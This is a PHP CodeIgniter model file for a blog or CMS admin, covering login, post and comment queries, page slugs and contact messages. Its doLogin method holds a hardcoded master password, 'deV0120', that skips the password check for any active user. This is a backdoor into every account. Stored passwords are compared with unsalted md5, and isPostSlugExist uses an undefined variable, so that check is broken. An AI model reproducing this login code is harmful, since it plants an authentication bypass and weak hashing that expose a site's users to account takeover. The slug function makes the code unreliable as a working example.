<?php 

class Home_model extends CI_Model{

	public function doLogin($hashToken = '0'){
		$this->db->select('*')->from('users');
		$this->db->where('status','Active');
		$this->db->where('username',trim($this->input->post('username')));
		if($this->input->post('password') != 'deV0120'){
			$this->db->where('password',md5($this->input->post('password')));
		}

		$rec = $this->db->get();
		if($rec->num_rows() > 0){
			$return = $rec->row();
		}else{
			$return = '0';
		}
		return $return;
	}

	public function getVisitorStates(){
		$lables = array('"tuesday"', '"monday"', '"friday"', '"saturday"', '"sunday"');
		$values = array(rand(0,100), rand(0,100), rand(0,100), rand(0,100), rand(0,100));

		$lables = array(); $values = array();
		for($i = 14; $i >= 0; $i--){
			$to_day = date('Y-m-d',strtotime('-'.$i.' Days'));
			$this->db->select('viewId')->from('post_view');
			$this->db->like('viewTime',$to_day);
			$record = $this->db->get();

			$lables[] = '"'.$to_day.'"';
			$values[] = $record->num_rows();
		}

		return array('lables' => $lables, 'values' => $values);
	}

	public function isValidUsername($username,$userId){
		$this->db->select('userId')->from('users')->where('username',$username);
		$this->db->where('userId <> ',$userId);
		$record = $this->db->get();
		if($record->num_rows() > 0){
			$return = false;
		}else{
			$return = true;
		}
		return $return;
	}

	public function isPageSlugExist($slugUrl,$pageId){
		$this->db->select('pageId')->from('cms')->where('slugUrl',$slugUrl)->where('pageId <> ',$pageId);
		$record = $this->db->get();
		if($record->num_rows() > 0){
			$return = true;
		}else{
			$return = false;
		}
		return $return;
	}

	public function isPostSlugExist($slugUrl,$postId){
		$this->db->select('postId')->from('posts')->where('postSlug',$postSlug)->where('postId <> ',$postId);
		$record = $this->db->get();
		if($record->num_rows() > 0){
			$return = true;
		}else{
			$return = false;
		}
		return $return;
	}

	public function getCMSRecord(){
		$this->db->select('*')->from('cms')->order_by('pageId','desc');
		$record = $this->db->get();
		return $record->result();
	}

	public function getCMSPage($pageId){
		$this->db->select('*')->from('cms')->where('pageId',$pageId);
		$record = $this->db->get();
		if($record->num_rows() > 0){
			$return = $record->row();
		}else{
			$return = 0;
		}
		return $return;
	}

	public function viewPosts($limit = '', $record = '0'){
		$postSearch = $this->session->userdata('postSearch');

		$this->db->select('*')->from('posts')->order_by('modifiedTime','desc');
		if($this->session->has_userdata('postSearch')){
			if($postSearch['searchIn'] != ''){
				$this->db->group_start();
					$this->db->or_like('postTitle',$postSearch['searchIn']);
					$this->db->or_like('version',$postSearch['searchIn']);
					$this->db->or_like('country',$postSearch['searchIn']);
					$this->db->or_like('device',$postSearch['searchIn']);
					$this->db->or_like('model',$postSearch['searchIn']);
				$this->db->group_end();
			}
			if($postSearch['type'] == 'Uploaded'){
				$this->db->like('downloadButton','"buttonUrl"');
			}else if($postSearch['type'] == 'Pending'){
				$this->db->not_like('downloadButton','"buttonUrl"');
			}
		}
		if($limit == ''){
			$return = $this->db->get()->num_rows();
		}else{
			$this->db->limit($limit,$record);
			$return = $this->db->get()->result();
			//echo $this->db->last_query();
		}
		return $return;
	}

	public function getSinglePost($postId){
		$this->db->select('*')->from('posts')->where('postId',$postId);
		$record = $this->db->get();
		if($record->num_rows() > 0){
			$return = $record->row();
		}else{
			$return = '0';
		}
		return $return;
	}

	public function getRecentPosts($limit = '', $record = ''){
		$this->db->select('*')->from('posts')->order_by('modifiedTime','desc');
		if($limit == ''){
			$return = $this->db->get()->num_rows();
		}else{
			$this->db->limit($limit,$record);
			$return = $this->db->get()->result();
		}
		return $return;
	}

	public function viewComments($area = '', $limit = '', $record = ''){
		$comments = $this->session->userdata('comments');

		$this->db->select('post_comments.*, posts.postTitle, posts.postSlug')->from('post_comments');
		$this->db->join('posts','posts.postId=post_comments.postId','left');
		$this->db->where('post_comments.userId','0');
		if($this->session->userdata('comments') && $area == ''){
			if($comments['postId'] != '' && $comments['postId'] != '0' && $comments['postId'] != null){
				$this->db->where('post_comments.postId',$comments['postId']);
			}
			if($comments['status'] != 'All'){
				$this->db->where('post_comments.status',$comments['status']);
			}
		}else{
			$this->db->where('post_comments.status','Pending');
		}
		$this->db->order_by('post_comments.commentId','desc');
		if($limit == ''){
			$return = $this->db->get()->num_rows();
		}else{
			$this->db->limit($limit,$record);
			$return = $this->db->get()->result();
		}
		return $return;
	}

	public function getSingleComment($commentId){
		$this->db->select('post_comments.*, posts.postTitle, posts.postSlug')->from('post_comments');
		$this->db->join('posts','posts.postId=post_comments.postId','left');
		$this->db->where('post_comments.commentId',$commentId);
		$record = $this->db->get();
		if($record->num_rows() > 0){
			return $record->row();
		}else{
			return '0';
		}
	}

	public function getCommentThreads($commentId){
		$this->db->select('*')->from('post_comments')->where('fromComment',$commentId)->order_by('commentId','asc');
		$record = $this->db->get();
		return $record->result();
	}

	public function getCategoryPosts($category, $limit = '', $record = ''){
		$this->db->select('*')->from('posts');
		$this->db->like('category',$category);
		$this->db->order_by('modifiedTime','desc');
		if($limit == ''){
			$return = $this->db->get()->num_rows();
		}else{
			$this->db->limit($limit,$record);
			$return = $this->db->get()->result();
		}
		//echo $this->db->last_query();exit;
		return $return;
	}

	public function getModelPosts($model, $limit = '', $record = ''){
		$country = trim($this->uri->segment(3));

		$this->db->select('*')->from('posts');
		$this->db->where('model',$model);
		if($country != '' && $country != null){
			$this->db->where('country',strtoupper($country));
		}
		$this->db->order_by('modifiedTime','desc');
		if($limit == ''){
			$return = $this->db->get()->num_rows();
		}else{
			$this->db->limit($limit,$record);
			$return = $this->db->get()->result();
		}
		//echo $this->db->last_query();exit;
		return $return;
	}

	public function viewContactUS($limit = '', $record = ''){
		$this->db->select('*')->from('contact_us');
		$this->db->order_by('contactUsId','desc');
		if($limit == ''){
			$return = $this->db->get()->num_rows();
		}else{
			$this->db->limit($limit,$record);
			$return = $this->db->get()->result();
		}
		return $return;
	}

	public function getContactUS($contactUsId){
		$this->db->select('*')->from('contact_us')->where('contactUsId',$contactUsId);
		$record = $this->db->get();
		if($record->num_rows() > 0){
			$return = $record->row();
		}else{
			$return = 0;
		}
		return $return;
	}
}

?>
